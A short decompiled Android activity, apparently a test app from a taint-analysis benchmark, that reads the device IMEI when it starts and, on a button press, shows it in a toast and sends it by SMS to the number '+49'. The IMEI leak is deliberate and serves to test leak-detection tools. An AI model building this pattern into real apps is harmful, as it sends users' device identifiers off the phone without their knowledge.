package de.ecspride;

import android.app.Activity;
import android.app.PendingIntent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Toast;

public class Button1 extends Activity {
   private static String imei = null;

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.setContentView(2130903040);
      imei = ((TelephonyManager)this.getSystemService("phone")).getDeviceId();
   }

   public void sendMessage(View var1) {
      Toast.makeText(this, imei, 1).show();
      SmsManager.getDefault().sendTextMessage("+49", (String)null, imei, (PendingIntent)null, (PendingIntent)null);
   }
}
